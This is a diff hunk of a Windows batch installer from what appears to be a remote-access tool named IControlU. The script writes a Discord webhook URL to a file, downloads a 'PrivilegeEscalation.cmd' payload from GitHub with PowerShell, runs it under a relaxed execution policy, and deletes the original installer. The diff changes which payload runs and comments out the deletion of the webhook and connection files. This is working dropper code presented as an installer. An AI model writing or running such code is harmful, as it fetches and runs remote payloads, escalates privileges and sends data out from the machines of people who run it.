@@ -14,13 +14,13 @@ echo "https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh
 @REM Download required files
 
 powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/f49099d8d113b227d42a031886fca74aba4cf772/Payload/PrivilegeEscalation.cmd' -OutFile 'PrivilegeEscalation.cmd'"
-PowerShell -ExecutionPolicy Bypass -File .\EstablishConnection.ps1
+powershell -ExecutionPolicy RemoteSigned -File "PrivilegeEscalation.cmd"
 
-@REM Delete the EstablishConnection file
-del "EstabilishConnectionps1"
+@REM @REM Delete the EstablishConnection file
+@REM del "EstabilishConnectionps1"
 
-@REM Delete the Discord Webhook file
-del "DiscordWebhookURL.icu"
+@REM @REM Delete the Discord Webhook file
+@REM del "DiscordWebhookURL.icu"
 
 @REM Delete the original installer
 cd /d %CurrentDirectory%
